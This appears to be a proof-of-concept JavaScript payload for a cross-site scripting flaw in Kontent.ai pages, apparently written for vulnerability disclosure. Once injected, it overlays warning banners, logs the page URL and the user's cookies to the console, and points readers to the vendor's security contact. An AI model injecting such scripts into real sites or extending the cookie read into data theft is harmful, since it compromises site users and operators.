// xss-poc.js - Proof of Concept for Kontent.ai XSS Vulnerability

(function() {
    console.log('XSS POC loaded from GitHub!');
    
    // Create a visible proof
    const banner = document.createElement('div');
    banner.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 999999;
        background: #ff0000;
        color: white;
        padding: 20px;
        text-align: center;
        font-family: Arial, sans-serif;
        font-size: 24px;
        font-weight: bold;
        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        animation: pulse 2s infinite;
    `;
    
    // Add animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { background: #ff0000; }
            50% { background: #cc0000; }
            100% { background: #ff0000; }
        }
    `;
    document.head.appendChild(style);
    
    banner.innerHTML = `
          SECURITY VULNERABILITY FOUND <br>
        <span style="font-size: 16px; font-weight: normal;">
            This page is vulnerable to Cross-Site Scripting (XSS)<br>
            External scripts can be loaded from any domain<br>
            Contact: security@kontent.ai
        </span>
    `;
    
    document.body.insertBefore(banner, document.body.firstChild);
    
    // Log evidence
    console.log('XSS POC executed successfully');
    console.log('Current page:', window.location.href);
    console.log('Cookies:', document.cookie);
    
    // Show the vulnerability details
    setTimeout(() => {
        const details = document.createElement('div');
        details.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 999999;
            background: #1a1a2e;
            color: #00ff88;
            padding: 20px;
            border-radius: 10px;
            font-family: monospace;
            font-size: 12px;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.8);
            border: 2px solid #00ff88;
        `;
        details.innerHTML = `
            <strong style="color: #ff6b6b;">💀 XSS Vulnerability Confirmed</strong><br><br>
            <span style="color: #ffd93d;">Issue:</span> No CSP protection for scripts<br>
            <span style="color: #ffd93d;">Impact:</span> Remote code execution possible<br>
            <span style="color: #ffd93d;">Evidence:</span> Script loaded from GitHub<br>
            <br>
            <span style="color: #6bcb77;">Report to:</span> security@kontent.ai
        `;
        document.body.appendChild(details);
    }, 1000);
})();